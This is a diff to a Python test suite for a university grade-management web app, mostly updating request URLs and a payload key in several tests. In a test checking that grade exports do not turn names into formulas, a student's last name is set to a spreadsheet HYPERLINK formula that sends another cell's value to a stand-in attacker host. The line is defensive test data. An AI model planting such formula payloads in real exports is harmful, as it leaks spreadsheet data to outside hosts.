@@ -165,7 +165,7 @@ async def test_cabeceras_de_seguridad(client):
 async def test_peticion_demasiado_grande_se_rechaza_antes_de_leerla(client, course):
     limit = get_settings().max_request_bytes
     response = await client.post(
-        f"/teacher/subjects/{course['subject_id']}/grades/import",
+        f"{course['url']}/grades/import",
         content=b"x" * 16,
         headers={**course["headers"], "Content-Length": str(limit + 1)},
     )
@@ -301,9 +301,8 @@ async def test_exportar_no_convierte_nombres_en_formulas(client, campus, session
     ana = await session.get(User, campus["students"]["Ana"]["id"])
     ana.last_name = '=HYPERLINK("https://evil.test/?"&A5,"Ver")'
     await session.commit()
-    mat = campus["subjects"]["MAT-101"]
     response = await client.get(
-        f"/teacher/subjects/{mat['id']}/grades/export",
+        f"{campus['urls']['MAT-101']}/grades/export",
         headers=campus["teachers"]["Pedro Profe"],
     )
     sheet = load_workbook(io.BytesIO(response.content))["Planilla"]
@@ -318,7 +317,7 @@ async def test_importaciones_ocultas_al_perder_la_materia(client, course, login_
     job_id = (await upload(client, course)).json()["id"]
     coord = await login_as(Role.COORDINATOR, email="coord2@uni.edu")
     teacher_id = (await client.get("/auth/me", headers=course["headers"])).json()["id"]
-    await client.put(f"/teachers/{teacher_id}/subjects", json={"subject_ids": []}, headers=coord)
+    await client.put(f"/teachers/{teacher_id}/subjects", json={"assignments": []}, headers=coord)
 
     detail = await client.get(f"/teacher/import-jobs/{job_id}", headers=course["headers"])
     assert detail.status_code == 404
